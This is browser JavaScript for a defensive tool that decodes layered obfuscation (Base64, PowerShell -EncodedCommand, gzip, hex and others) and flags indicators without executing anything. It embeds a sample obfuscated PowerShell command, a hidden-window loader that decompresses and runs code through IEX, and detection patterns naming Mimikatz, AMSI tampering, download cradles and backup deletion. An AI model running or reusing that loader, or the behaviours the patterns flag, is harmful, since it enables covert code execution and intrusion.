// Payload Decoder: peels Base64, PowerShell -EncodedCommand (UTF-16LE), gzip / deflate, hex, URL encoding, HTML
// entities, char-code arrays and reversed strings, layer by layer, then lists the indicators and risky commands in the
// result. Nothing is executed: every layer is shown as text only.
(function () {
  'use strict';
  var OV = window.OV, I = window.VSIoc;
  var $ = function (id) { return document.getElementById(id); };
  var last = null, run = 0;

  var SAMPLE = "powershell.exe -NoP -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAWwBJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQBdAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwBIADQAcwBJAEEAQQBBAEEAQQBBAEEAQQBDAGgAWABOADAAUQBxAEMATQBCAFEAQQAwAEYALwB4AFEAWgBoAEMAWABxAGMAawBpAE4ASwBEAFcARgBBAFAAbQBTAEIAUgBEADcANwBNAGUAYgBIAEYAYwBMAEwAZABNAHYAcgA2ADYAUAB6AEEAOABlAFcAdQB3AFQAVwA2AEQARQArAFUANQBEAFYASQBjAE0ATwBoADEAZwBwAG4ASwBuADAASgBSAHgAUQBqAFcAZwBmAFYATwBBAGIAcwA2AHQAQgBHADEAWQBRAHoAcwBRADAANwBtADYALwBTAFcAcwBRAFoAYwBCAGEAVwBwADgAUABkADgAeQBYAHMAegBUAHAAcgBJADgAYQBPAHIASgBxAG4AZwBEADIASQBsAGkASwBPAGsAegB5AEQATgBPAFcAUQA4AEEAUwAyAFcAWgBIAHoAbgBNAGUATwB4AEkAUQBwAEwAQwA1AGgAWQBkAG0AUgBzAEIAUwAxADEAawBoADAAegBtAE4AMQAwAGYAOAB2ADEANwBlAHYAUQBTAHYAWgB1ADcAYwBFAC8AQwBEADcAQQBYADEAbwArAFoAUwB0AEEAQQBBAEEAJwApACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkA";

  // ---------------------------------------------------------------- byte helpers
  var B64 = /^[A-Za-z0-9+/]+={0,2}$/, B64URL = /^[A-Za-z0-9_-]+={0,2}$/;
  function b64bytes(s) {
    s = s.replace(/\s+/g, '');
    if (B64URL.test(s) && !B64.test(s)) s = s.replace(/-/g, '+').replace(/_/g, '/');
    while (s.length % 4) s += '=';
    try { var bin = atob(s), b = new Uint8Array(bin.length); for (var i = 0; i < bin.length; i++) b[i] = bin.charCodeAt(i); return b; } catch (e) { return null; }
  }
  function hexbytes(s) {
    var h = s.replace(/0x|\\x|[\s,:-]/gi, '');
    if (h.length < 8 || h.length % 2 || /[^0-9a-f]/i.test(h)) return null;
    var b = new Uint8Array(h.length / 2);
    for (var i = 0; i < b.length; i++) b[i] = parseInt(h.substr(i * 2, 2), 16);
    return b;
  }
  function printable(str) {
    if (!str) return 0;
    var ok = 0;
    for (var i = 0; i < str.length; i++) { var c = str.charCodeAt(i); if (c === 9 || c === 10 || c === 13 || (c >= 32 && c < 127) || (c > 159 && c !== 0xfffd)) ok++; }
    return ok / str.length;
  }
  // Decide how a byte array is best read: compressed, UTF-16LE text (PowerShell), or UTF-8 text.
  function bytesKind(b) {
    if (!b || !b.length) return null;
    if (b[0] === 0x1f && b[1] === 0x8b) return 'gzip';
    if (b[0] === 0x78 && (b[1] === 0x01 || b[1] === 0x5e || b[1] === 0x9c || b[1] === 0xda)) return 'deflate';
    if (b[0] === 0x4d && b[1] === 0x5a) return 'pe';
    if (b[0] === 0x50 && b[1] === 0x4b) return 'zip';
    var zeros = 0;
    for (var i = 1; i < Math.min(b.length, 400); i += 2) if (b[i] === 0) zeros++;
    if (zeros > Math.min(b.length, 400) / 2 * 0.8) return 'utf16';
    return 'utf8';
  }
  function inflate(b, fmt) {
    if (!('DecompressionStream' in window)) return Promise.reject(new Error('This browser cannot decompress'));
    var ds = new DecompressionStream(fmt);
    var stream = new Blob([b]).stream().pipeThrough(ds);
    return new Response(stream).arrayBuffer().then(function (ab) { return new Uint8Array(ab); });
  }
  var utf8 = function (b) { return new TextDecoder('utf-8', { fatal: false }).decode(b); };
  var utf16 = function (b) { return new TextDecoder('utf-16le').decode(b); };

  // Base64 bytes to text, following compression; tries raw deflate when it is printable garbage otherwise.
  function fromBytes(b, label) {
    var k = bytesKind(b);
    if (k === 'gzip') return inflate(b, 'gzip').then(function (o) { return fromBytes(o, label + ' → gzip'); });
    if (k === 'deflate') return inflate(b, 'deflate').then(function (o) { return fromBytes(o, label + ' → zlib'); });
    if (k === 'pe' || k === 'zip') return Promise.resolve({ label: label, text: null, binary: k === 'pe' ? 'a Windows executable (MZ header)' : 'a ZIP archive (PK header)', bytes: b });
    var t = k === 'utf16' ? utf16(b) : utf8(b);
    if (printable(t) > 0.92) return Promise.resolve({ label: label + (k === 'utf16' ? ' (UTF-16LE text)' : ''), text: t });
    return inflate(b, 'deflate-raw').then(function (o) { return fromBytes(o, label + ' → raw deflate'); }, function () { return { label: label, text: null, binary: 'binary data that is not text', bytes: b }; });
  }

  // ---------------------------------------------------------------- one layer
  // Finds the most likely encoded part of the text and decodes it. Returns null when nothing more can be peeled.
  function layer(text) {
    var t = text.trim(), m;
    // PowerShell -EncodedCommand / -enc / -e
    if ((m = t.match(/(?:^|\s)-(?:e|ec|en|enc|enco|encod|encode|encoded|encodedc\w*)\s+["']?([A-Za-z0-9+/=]{16,})["']?/i))) {
      var b = b64bytes(m[1]);
      if (b) return fromBytes(b, 'PowerShell -EncodedCommand: Base64');
    }
    // [Convert]::FromBase64String('...') and similar calls
    if ((m = t.match(/FromBase64String\(\s*["']([A-Za-z0-9+/=\s]{16,})["']\s*\)/i)) || (m = t.match(/(?:atob|base64_decode|b64decode)\(\s*["']([A-Za-z0-9+/=_-]{16,})["']/i))) {
      var b2 = b64bytes(m[1]);
      if (b2) return fromBytes(b2, 'Base64 inside a decode call');
    }
    // Hex first: "48 65 6c" or "0x48,0x65" is also valid Base64 once the spaces go, but it is hex.
    var hb = /^(?:0x|\\x)?[0-9a-f\s,:\\x-]+$/i.test(t) ? hexbytes(t) : null;
    if (hb) return fromBytes(hb, 'Hex');
    // The whole thing is Base64 (only accepted when it decodes to something readable or compressed)
    var compact = t.replace(/\s+/g, '');
    if (compact.length >= 16 && (compact.length % 4 === 0 || /[-_]/.test(compact)) && (B64.test(compact) || B64URL.test(compact)) && /[a-z]/.test(compact) && /[A-Z0-9+/]/.test(compact)) {
      var b3 = b64bytes(compact);
      if (b3) return fromBytes(b3, 'Base64').then(function (r) { return r.text != null || r.binary !== 'binary data that is not text' ? r : null; });
    }
    // URL encoding
    if (/%[0-9a-f]{2}/i.test(t) && (t.match(/%[0-9a-f]{2}/gi) || []).length >= 3) {
      try { var u = decodeURIComponent(t.replace(/\+/g, ' ')); if (u !== t) return Promise.resolve({ label: 'URL encoding', text: u }); } catch (e) { /* not valid */ }
    }
    // HTML entities
    if (/&#x?[0-9a-f]+;/i.test(t) && (t.match(/&#x?[0-9a-f]+;/gi) || []).length >= 3) {
      return Promise.resolve({ label: 'HTML entities', text: t.replace(/&#x([0-9a-f]+);/gi, function (_, h) { return String.fromCodePoint(parseInt(h, 16)); }).replace(/&#(\d+);/g, function (_, d) { return String.fromCodePoint(Number(d)); }) });
    }
    // Char codes: [char]72+[char]105, String.fromCharCode(72,105), chr(72)&chr(105)
    var codes = t.match(/(?:\[char\]\s*|chr\s*\(\s*)(\d{2,3})/gi);
    if (codes && codes.length >= 4) return Promise.resolve({ label: 'Character codes', text: codes.map(function (c) { return String.fromCharCode(Number(c.match(/\d+/)[0])); }).join('') });
    if ((m = t.match(/fromCharCode\(([\d,\s]{8,})\)/i))) return Promise.resolve({ label: 'String.fromCharCode', text: m[1].split(',').map(function (n) { return String.fromCharCode(Number(n)); }).join('') });
    // Reversed text ("llehsrewop", "ptth")
    var rev = t.split('').reverse().join('');
    if (/(powershell|http|iex|invoke-|downloadstring|cmd\.exe)/i.test(rev) && !/(powershell|http|iex|invoke-|downloadstring|cmd\.exe)/i.test(t)) return Promise.resolve({ label: 'Reversed text', text: rev });
    // Longest Base64 run inside other text
    var runs = t.match(/[A-Za-z0-9+/]{40,}={0,2}/g);
    if (runs) {
      runs.sort(function (a, b) { return b.length - a.length; });
      var b4 = b64bytes(runs[0]);
      if (b4) return fromBytes(b4, 'Base64 found inside the text').then(function (r) { return r.text && printable(r.text) > 0.92 ? r : null; });
    }
    return Promise.resolve(null);
  }

  var RISKY = [
    [/\b(iex|invoke-expression)\b/i, 'Runs code it builds or downloads (Invoke-Expression)'],
    [/downloadstring|downloadfile|downloaddata|invoke-webrequest|\biwr\b|invoke-restmethod|\birm\b|start-bitstransfer|net\.webclient|curl\s|wget\s/i, 'Downloads something from the internet'],
    [/frombase64string|\[convert\]::/i, 'Decodes a hidden payload at run time'],
    [/-w(indowstyle)?\s+h(idden)?|-nop\b|-noprofile|-ep\s+bypass|executionpolicy\s+bypass/i, 'Hides its window or bypasses PowerShell policy'],
    [/amsi(utils|initfailed)|\bamsi\b/i, 'Tampers with AMSI (anti-malware scanning)'],
    [/mimikatz|sekurlsa|lsadump|invoke-mimikatz/i, 'Credential theft tooling (Mimikatz)'],
    [/start-process|\bstart\s|shellexecute|wscript\.shell|cmd(\.exe)?\s+\/c/i, 'Starts another program'],
    [/certutil.+-(urlcache|decode)|bitsadmin|regsvr32|mshta|rundll32|wmic\s+process/i, 'Uses a built-in Windows tool often abused by attackers'],
    [/add-mppreference|set-mppreference|disablerealtimemonitoring/i, 'Changes Microsoft Defender settings'],
    [/vssadmin.+delete|wbadmin.+delete|shadowcopy/i, 'Deletes backups or shadow copies'],
    [/schtasks|new-scheduledtask|register-scheduledtask|currentversion\\run/i, 'Sets up persistence (scheduled task or Run key)']
  ];

  function analyze() {
    var input = $('input').value, mine = ++run;
    if (!input.trim()) { $('out').innerHTML = '<p class="empty">Paste an encoded string or command and press Decode.</p>'; $('note').disabled = true; last = null; return; }
    var layers = [{ label: 'Input', text: input }];
    (function step(cur, depth) {
      if (depth >= 10) return finish(layers);
      layer(cur).then(function (r) {
        if (mine !== run) return;
        if (!r) return finish(layers);
        layers.push(r);
        if (r.text == null || r.text === cur) return finish(layers);
        step(r.text, depth + 1);
      }, function (err) { layers.push({ label: 'Stopped', text: null, binary: err.message }); finish(layers); });
    })(input, 0);
  }

  function finish(layers) {
    var final = layers.filter(function (l) { return l.text != null; }).pop().text;
    var iocs = I ? I.unique(final, { max: 300 }).filter(function (x) { return !((x.type === 'ipv4' || x.type === 'ipv6') && I.isPrivateIp(x.value)); }) : [];
    var risky = RISKY.filter(function (r) { return r[0].test(final); }).map(function (r) { return r[1]; });
    last = { layers: layers, final: final, iocs: iocs, risky: risky };
    var html = '<div class="stats"><div class="stat"><b>' + (layers.length - 1) + '</b><span>layer' + (layers.length === 2 ? '' : 's') + ' decoded</span></div>' +
      '<div class="stat"><b style="color:' + (risky.length ? 'var(--bad)' : 'inherit') + '">' + risky.length + '</b><span>risky behaviours</span></div><div class="stat"><b>' + iocs.length + '</b><span>indicators</span></div></div>';
    html += OV.nextSteps(risky.length ? [
      'Treat the host that ran this as compromised until checked: isolate it if the command downloaded or started anything.',
      iocs.length ? 'Block the indicators below and hunt for them across the estate (the button sends them to the Hunting Query Generator).' : 'Look for the same command line on other hosts (process creation 4688 or Sysmon 1).',
      { t: 'Find how it started: the parent process, a scheduled task or a document macro.', href: '/guides/decode-encoded-powershell/', link: 'Guide' }
    ] : layers.length > 1 ? ['The decoded text shows none of the built-in risky patterns. Read it anyway; obfuscation is rarely innocent.'] : ['Nothing to decode was found. If this is obfuscated in another way (XOR, custom alphabet), CyberChef can help.'], risky.length ? 'bad' : '');
    if (risky.length) html += '<h3 style="font-family:var(--display);font-size:.95rem;margin:4px 0 8px">What the payload does</h3><ul class="reasons">' + risky.map(function (r) { return '<li class="bad">' + OV.esc(r) + '</li>'; }).join('') + '</ul>';
    html += '<div class="viz"><h3>Layers</h3><div class="path" role="list" aria-label="Decoding layers">' + layers.map(function (l, i) {
      return (i ? '<div class="hop-link" aria-hidden="true"><span>decode</span></div>' : '') + '<div class="hop' + (i === layers.length - 1 && risky.length ? ' origin' : i === layers.length - 1 ? ' me' : '') + '" role="listitem"><div class="hop-k">' + (i ? 'Layer ' + i : 'Input') + '</div><b>' + OV.esc(i ? l.label : (layers[0].text.length + ' characters')) + '</b></div>';
    }).join('') + '</div></div>';
    layers.slice(1).forEach(function (l, i) {
      html += '<div class="q-block"><div class="q-h"><b>Layer ' + (i + 1) + ': ' + OV.esc(l.label) + '</b>' + (l.text != null ? '<button class="copy" type="button" data-i="' + (i + 1) + '">Copy</button>' : '') + '</div>' +
        (l.text != null ? '<pre class="q">' + OV.esc(l.text.length > 6000 ? l.text.slice(0, 6000) + '\n… (' + l.text.length + ' characters)' : l.text) + '</pre>' : '<p class="sub">Result is ' + OV.esc(l.binary || 'binary') + '. It is not shown as text and is never run.</p>') + '</div>';
    });
    if (iocs.length) html += '<h3 style="font-family:var(--display);font-size:.95rem;margin:14px 0 8px">Indicators in the decoded payload</h3><ul class="ioc-list">' + iocs.slice(0, 40).map(function (x) {
      return '<li><span class="ioc-v"><span>' + OV.esc(I.defang(x.value, x.type)) + ' <span class="sub">' + OV.esc(I.LABEL_OF[x.type] || x.type) + '</span></span>' + OV.pivots(x.type, x.value) + '</span><button class="copy" type="button" data-v="' + OV.esc(x.value) + '">Copy</button></li>';
    }).join('') + '</ul><div class="send-row"><button class="btn btn-ghost btn-sm" type="button" id="to-hunt">Send indicators to Hunting Query Generator</button></div>';
    $('out').innerHTML = html;
    $('note').disabled = false;
  }

  function note() {
    var t = ['Payload decode (OpsVantage Payload Decoder)', 'Layers: ' + last.layers.slice(1).map(function (l) { return l.label; }).join(' > ')];
    if (last.risky.length) t.push('Behaviour:', last.risky.map(function (r) { return '- ' + r; }).join('\n'));
    if (last.iocs.length) t.push('Indicators (defanged):', last.iocs.map(function (x) { return '- ' + I.defang(x.value, x.type); }).join('\n'));
    t.push('Decoded payload:', last.final.slice(0, 3000));
    return t.join('\n');
  }

  $('analyze').addEventListener('click', analyze);
  $('sample').addEventListener('click', function () { $('input').value = SAMPLE; analyze(); });
  $('clear').addEventListener('click', function () { $('input').value = ''; analyze(); $('input').focus(); });
  $('note').addEventListener('click', function () { if (last) OV.copy(note(), 'Ticket note copied'); });
  $('out').addEventListener('click', function (e) {
    var b = e.target.closest('.copy');
    if (b && last) { OV.copy(b.dataset.v != null ? b.dataset.v : last.layers[Number(b.dataset.i)].text, 'Copied'); return; }
    if (e.target.closest('#to-hunt') && last) OV.sendTo('/hunt-queries/', last.iocs.map(function (x) { return x.value; }).join('\n'));
  });
  $('input').addEventListener('paste', function () { setTimeout(analyze, 0); });
  OV.ctrlEnter($('input'), analyze);
  var handed = OV.takeHandoff();
  if (handed) { $('input').value = handed; analyze(); }
})();
